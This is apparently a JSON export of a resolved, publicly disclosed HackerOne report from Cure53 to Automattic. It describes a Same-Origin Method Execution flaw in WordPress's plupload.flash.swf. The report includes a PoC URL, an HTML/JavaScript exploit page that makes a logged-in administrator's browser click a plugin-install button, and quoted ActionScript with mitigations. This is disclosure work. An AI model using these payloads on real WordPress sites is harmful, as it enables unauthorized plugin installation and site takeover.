{
  "id": 134738,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzQ3Mzg=",
  "url": "https://hackerone.com/reports/134738",
  "title": "WordPress SOME bug in plupload.flash.swf leading to RCE",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-04-26T09:53:11.012Z",
  "submitted_at": "2016-04-26T09:53:11.012Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "cure53",
    "url": "/cure53",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/072/123/1c801729a8988a0b6873c3d9ccf131e2a1488011_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 111,
    "url": "https://hackerone.com/automattic",
    "handle": "automattic",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Automattic",
      "twitter_handle": "",
      "website": "https://automattic.com",
      "about": "WordPress.com, Jetpack, Texts, Akismet, Gravatar, WooCommerce, Crowdsignal, Tumblr and more!"
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2016-07-10T12:50:19.487Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2016-06-10T12:50:14.410Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Intro\n==\n\nWordPress is vulnerable against a Same-Origin Method Execution (SOME) vulnerability that stems from an insecure URL sanitization problem performed in the file *plupload.flash.swf*. The code in the file attempts to remove *flashVars* [¹](https://helpx.adobe.com/flash/kb/pass-variables-swfs-flashvars.html) in case they have been set GET parameters but fails to do so, enabling XSS via *ExternalInterface* [²](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/external/ExternalInterface.html).\n\nThe attack technique was first described by Soroush Dalili in 2013 [³](https://soroush.secproject.com/blog/2013/10/catch-up-on-flash-xss-exploitation-bypassing-the-guardians-part-1/). The vulnerability in *plupload.flash.swf* was discovered in April 2016, first identified as SOME[⁴](http://www.benhayak.com/2015/06/same-origin-method-execution-some.html) bug by Kinugawa. Then, after a team review, the XSS potential was discovered and analyzed by Heiderich, Kinugawa and Inführ. Finally, it was discovered, that this file comes packaged with latest WordPress and the issue was reported here by Heiderich et al.\n\n**Simple PoC:**\nhttp://example.com//wp-includes/js/plupload/plupload.flash.swf?%#target%g=alert&uid%g=hello&\n\nA more complex PoC was created to demonstrate the potential Remote Code Execution attack (RCE) of this vulnerability. A detailed description thereof can be found below.\n\n```html\n<button onclick=\"fire()\">Click</button>\n<script>\nfunction fire() {\n open('javascript:setTimeout(\"location=\\'http://example.com/wp-includes/js/plupload/plupload.flash.swf?%#target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click&uid%g=hello&\\'\", 2000)');\n  setTimeout('location=\"http://example.com/wp-admin/plugin-install.php?tab=plugin-information&plugin=wp-super-cache&TB_iframe=true&width=600&height=550\"')\n}\n</script>\n```\n\nBackground\n==\n\nThe majority of background information as to why this kind of attack works and how the protective mechanisms installed in the SWF can be bypassed was already explained in depth in this bug report:\n\nhttps://hackerone.com/bugs?subject=user&report_id=134546\n\nThis section will therefore describe the SOME bug in more detail and omit the basics on why the attack works as they are identical to the ones in the other ticket. Now, let's get specific with this bug's details.\n\nSimilar to the affected file in the linked report, Plupload employs the so called “GET Killer”:\n\n```actionscript\nparams = root.loaderInfo.parameters;\npos = root.loaderInfo.url.indexOf('?');\nif (pos !== -1) {\n    query = Utils.parseStr(root.loaderInfo.url.substr(pos + 1));        \n    \n    for (var key:String in params) {    \n        if (query.hasOwnProperty(Utils.trim(key))) {\n            delete params[key];\n        }\n    }\n}\n```\n\nFrom: https://github.com/moxiecode/moxie/blob/d91c63758c1d372a38615e8b966b50545faa70ca/src/flash/src/Moxie.as#L70\n\nThe string parsing is done in a different ActionScript file:\n\n```actionscript\nstatic public function parseStr (str:String) : Object {\n    var hash:Object = {},\n        arr1:Array, arr2:Array;\n    \n    str = unescape(str).replace(/\\+/g, \" \");\n    \n    arr1 = str.split('&');\n    if (!arr1.length) {\n        return {};\n    }\n    \n    for (var i:uint = 0, length:uint = arr1.length; i < length; i++) {\n        arr2 = arr1[i].split('=');\n        if (!arr2.length) {\n            continue;\n        }\n        hash[Utils.trim(arr2[0])] = Utils.trim(arr2[1]);\n    }\n    return hash;\n}\n```\n\nFrom: https://github.com/moxiecode/moxie/blob/d91c63758c1d372a38615e8b966b50545faa70ca/src/flash/src/mxi/Utils.as#L102\n\nThe sanitization in this file is done quite well and strict enough to prohibit XSS attacks. An attacker can however select a different type of attack, also known as SOME or Reverse Clickjacking.\n\nThe affected code can be found here:\n\n```actionscript\nprivate function _fireEvent(evt:*, obj:* = null):void {\n    try {\n        ExternalInterface.call(eventDispatcher, evt, obj);\n    } catch(err:*) {\n        //_fireEvent(\"Exception\", { name: 'RuntimeError', message: 4 });\n        \n        // throwing an exception would be better here\n    }\n}\n```\n\nThe method is being called from within the `_init()` method and receives an event and an optional object. The actual event dispatcher is stored as an object member at a different place in the code.\n\n**Calling _fireEvent:**\n```actionscript\nMoxie.uid = Utils.sanitize(params[\"uid\"]);    \n\n[...]\n\n_fireEvent(Moxie.uid + \"::Init\");    \n```\n\n\n**Setting the event dispatcher:**\n```actionscript\n// Event dispatcher\nif (params.hasOwnProperty(\"target\") && /^[\\w\\.]+$/.test(params[\"target\"])) {\n    eventDispatcher = params[\"target\"];\n}\n```\n\nThe sanitation for both the event dispatcher and the event string is quite tough and only allows word characters in one case, and word characters and the dot in the other case:\n\n```actionscript\nif (params.hasOwnProperty(\"target\") && /^[\\w\\.]+$/.test(params[\"target\"])) {\n\n```\n\n```actionscript\nstatic public function sanitize(str:String) : String\n{\n    // allow only [a-zA-Z0-9_]\n    return str.replace(/[^\\w]/g, '');\n}\n[...]\nMoxie.uid = Utils.sanitize(params[\"uid\"]);\n\n```\n\nDespite the strong validation, the attacker can still cause damage - tremendous damage too. This is done by executing a SOME attack. This kind of attack allows to generate certain types of events by abusing the callback.\n\nAn attacker can for example click a button on the same domain as the Flash file by instructing the Flash file, not to execute a pre-defined callback but rather by making use of certain DOM properties that give more or less direct access to the button and then by executing a `click()` method. Let’s have a look at a trivial example first and imagine *victim.com* that hosts both the Plupload SWF and some logic, where a click on a button will, let’s say, delete a user:\n\n* Attacker crafts a specific payload\n* Attacker then lures logged in victim to a website \n* The website will do the following steps \n* Open the Plupload SWF in a new tab\n* Have the SWF use the target parameter `opener.document.body.firstElementChild.firstElementChild.click`\n* While the SWF still loads, the `opener` location changes\n* It navigates to *victim.com/admin*\n* Now, SWF and page are on the same domain\n* SWF is now allows to perform clicks on opener. The button will be clicked\n\nDone, that is the whole attack in simple. Open SWF in a new window, define a callback that traverses to an important element and clicks it, navigate the opener to the page containing the element, have the click happen.\n\nNow, the following more specific PoC describes the attack against WordPress and shows, how we can turn the SOME into an RCE!\n\n1. An attacker sends a link that contains the exploit to an authenticated user\n2. The user (victim) opens the link and clicks the button\n3. The exploit opens a new window to the SWF file, meanwhile the other window is loading the plugin page\n5. The exploit then triggers the install button of a malicious plugin\n6. The plugin is installed and the malicious codes are uploaded on the server accordingly\n\n```html\n<button onclick=\"fire()\">Click</button>\n<script>\nfunction fire() {\n open('javascript:setTimeout(\"location=\\'http://example.com/wp-includes/js/plupload/plupload.flash.swf?%#target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click&uid%g=hello&\\'\", 2000)');\n  setTimeout('location=\"http://example.com/wp-admin/plugin-install.php?tab=plugin-information&plugin=wp-super-cache&TB_iframe=true&width=600&height=550\"')\n}\n</script>\n```\n\nAffected Systems\n==\n\nAll WordPress instances that allow to directly call this file. That should be the absolute majority. Google finds a couple of them but we assume it is actually significantly more[⁹](https://www.google.com/search?q=inurl:/wp-includes/js/plupload/plupload.flash.swf+ext:swf&channel=fs&start=10).\n\nHere is some numbers that other people guesstimate:\n * https://managewp.com/14-surprising-statistics-about-wordpress-usage\n * https://www.quora.com/How-many-websites-are-built-on-Wordpress\n * https://wordpress.com/activity/\n\nFurther note, browser-based XSS filters will not detect the attack and hence not protect here.\n\nMitigation\n==\n\n* Prevent direct access to all Flash files in the WordPress folder (`Content-Disposition` headers might help)\n* Configure your WAF to block direct access to this file\n* Wait for the fix and update Wordpress\n\nCredits\n==\n\nCredits for this find go to Soroush Dalili for initially documenting the attack technique that helped bypassing “The GET Killer”.\n\nFurther credits go to Kinugawa, Filedescriptor and Heiderich of Cure53 for discovering the bug in WordPress default installations and developing an attack scenario leading to RCE by using SOME to install rogue WordPress Plugins.\n",
  "weakness": {
    "id": 70,
    "name": "Code Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2016-07-10T12:50:14.637Z",
  "allow_singular_disclosure_after": -239671099.49213168,
  "singular_disclosure_allowed": true,
  "vote_count": 49,
  "voters": [
    "static",
    "d1m0ck",
    "bobrov",
    "harisec",
    "hunter",
    "michiel",
    "wkcaj",
    "preben",
    "spam404",
    "nahamsec",
    "and 39 more..."
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
